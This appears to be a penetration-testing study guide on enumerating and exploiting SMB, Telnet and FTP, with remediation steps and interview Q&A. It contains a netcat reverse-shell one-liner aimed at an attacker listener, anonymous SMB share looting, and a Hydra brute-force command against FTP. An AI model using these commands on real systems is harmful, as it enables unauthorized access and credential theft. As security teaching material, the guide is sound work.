# 02 - Network Services I: SMB, Telnet & FTP Enumeration & Exploitation

## Overview
This assessment documents the architecture, reconnaissance methodology, exploitation vectors, and enterprise remediation strategies for three legacy network protocols: **SMB (Port 445/139)**, **Telnet (Port 23)**, and **FTP (Port 21/20)**.

---

## 1. SMB (Server Message Block)

### Architecture & Service Function
* **Transport:** NetBIOS over TCP (`139`) or Direct Hosted SMB over TCP (`445`).
* **Purpose:** Cross-platform file, printer, and IPC (Inter-Process Communication) sharing operating via a client-server model.
* **Security Concerns:** Null sessions (unauthenticated access), permissive share permissions, legacy dialect negotiation (SMBv1 vulnerabilities like MS17-010/EternalBlue).

### Enumeration Methodology
```bash
# 1. Version Detection & Script Scan
nmap -sV -p 139,445 --script smb-enum-shares,smb-enum-users <TARGET_IP>

# 2. Automated SMB Audit via Enum4linux
enum4linux -a <TARGET_IP>

# Targeted Enum4linux flags:
enum4linux -U <TARGET_IP>  # Harvest user accounts
enum4linux -S <TARGET_IP>  # Enumerate share names
enum4linux -G <TARGET_IP>  # Enumerate groups
enum4linux -P <TARGET_IP>  # Extract password policy (lockout threshold, min length)
```

### Exploitation: Anonymous & Guest Share Access
When access control is misconfigured, unauthenticated clients can read/write directly to shares:
```bash
# List shares anonymously
smbclient -L //<TARGET_IP> -N

# Connect to a target share with an anonymous session
smbclient //<TARGET_IP>/<SHARE_NAME> -U "Anonymous"
# (Or press Enter if prompted for an empty password)

# Basic smbclient navigation & exfiltration
smb: \> ls
smb: \> cd sensitive_data
smb: \> get credentials.txt
smb: \> put reverse_shell.sh
smb: \> help
smb: \> exit
```

### Remediation
1. Disable SMBv1 entirely across all endpoints and servers.
2. Require SMB signing and encryption (`SMB 3.x`).
3. Restrict `Guest` and `Anonymous` read/write access to administrative and data shares (`IPC$`, `C$`, custom shares).

---

## 2. Telnet (Telecommunication Network)

### Architecture & Attack Surface
* **Transport:** TCP Port `23`.
* **Purpose:** Bidirectional interactive text-oriented communication facility (Remote CLI).
* **Vulnerability Profile:** **Complete lack of encryption.** All traffic—including authentication credentials, session cookies, and executed commands—is transmitted over the wire in cleartext, trivializing credential sniffing via Wireshark or tcpdump.

### Enumeration & Banner Grabbing
```bash
# 1. Port Identification
nmap -sV -p 23 <TARGET_IP>

# 2. Interactive Banner Grabbing
telnet <TARGET_IP> 23
nc -vn <TARGET_IP> 23
```

### Exploitation & Reverse Shell Weaponization
If Telnet exposes a backdoor or an unauthenticated shell interface, inject an outbound payload to bypass ingress firewall restrictions:
```bash
# 1. On Kali Machine: Set up Netcat Listener
nc -lvnp 4444

# 2. In Target Telnet Session: Inject Reverse Shell (sh/bash FIFO)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_VPN_IP> 4444 >/tmp/f

# 3. Verify Shell on Listener
whoami
hostname
pwd
```

### Remediation
1. **Decommission Telnet immediately** in favor of **SSH (Port 22)** using TLS/public-key authentication.
2. Block ingress TCP Port 23 at edge and internal firewalls.

---

## 3. FTP (File Transfer Protocol)

### Dual-Channel Architecture
FTP maintains two separate TCP connections to decouple session control from data transmission:
* **Control Channel (Port 21):** Handles authentication, command entry, and status codes.
* **Data Channel (Port 20 or High Dynamic Ports):** Transmits directory listings and raw file transfers.

| Mode | Initiator of Data Connection | Firewall Consideration |
| :--- | :--- | :--- |
| **Active Mode** | Server connects to client's specified high port. | Fails if client is behind NAT/firewall blocking inbound server connections. |
| **Passive Mode (PASV)** | Client initiates connection to server's dynamically assigned high port. | Firewall-friendly for clients; requires the server to expose a designated dynamic port range. |

### Enumeration: Anonymous Access
```bash
# Nmap scan targeting anonymous authentication and default scripts
nmap -sV -sC -p 21 <TARGET_IP>

# Interactive manual test
ftp <TARGET_IP>
# Name: anonymous
# Password: <leave blank or enter anonymous>

# Interactive Session Commands
ftp> passive          # Toggle passive mode on/off
ftp> ls               # List files
ftp> cd folder        # Change directory
ftp> get file.txt     # Download file
ftp> put file.txt     # Upload file
ftp> bye              # Exit session
```

### Exploitation: Online Credential Brute-Forcing (Hydra)
When anonymous login is disabled but user accounts are known or enumerated:
```bash
# Brute-force FTP credentials using Hydra and the RockYou wordlist
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ftp
```
* `-l <username>`: Target user account.
* `-P <wordlist>`: Password list path.
* `-t 4`: Limit parallel connections to 4 to prevent server rate-limiting or crashing.
* `-vV`: Verbose output showing each attempt.
* `ftp`: Target protocol module.

### Remediation
1. Disable `Anonymous` FTP logins unless strictly required for public distribution.
2. Replace cleartext FTP with **SFTP (SSH File Transfer Protocol)** or **FTPS (FTP over TLS)**.
3. Enforce account lockout thresholds and IP rate-limiting to mitigate brute-force attempts.

---

## 4. Methodology Synthesis & Interview Quick-Reference

```text
[ RECONNAISSANCE ]      --> nmap -sV -p 21,23,139,445 <TARGET_IP>
       │
[ ENUMERATION ]         --> enum4linux -a <IP> | ftp <IP> (anonymous) | telnet <IP> 23
       │
[ ACCESS / EXPLOIT ]    --> smbclient -U Anonymous | hydra brute-force | Reverse Shell
       │
[ DOCUMENT & REMEDIATE] --> Enforce encryption (SSH, SFTP, SMBv3), disable legacy protocols.
```

### High-Impact Interview Q&A
* **Q: Why does FTP use two ports instead of one?**
  * *A:* It uses Port 21 (Control) for issuing commands and receiving status codes without interrupting ongoing data transfers, and Port 20 / PASV high ports (Data) specifically to transmit file payloads and directory listings.
* **Q: How does a reverse shell differ from a bind shell, and why is it preferred?**
  * *A:* A bind shell opens a listening port on the victim machine (frequently blocked by ingress firewalls). A reverse shell forces the victim to initiate an outbound connection back to the attacker's listener, easily bypassing stateful ingress firewall restrictions.
* **Q: What is the primary operational risk of Telnet in enterprise networks?**
  * *A:* It lacks transport-layer encryption; packet sniffers on any intermediate hop or within the broadcast domain can extract plain-text authentication credentials and commands directly from Layer 4 TCP payloads.
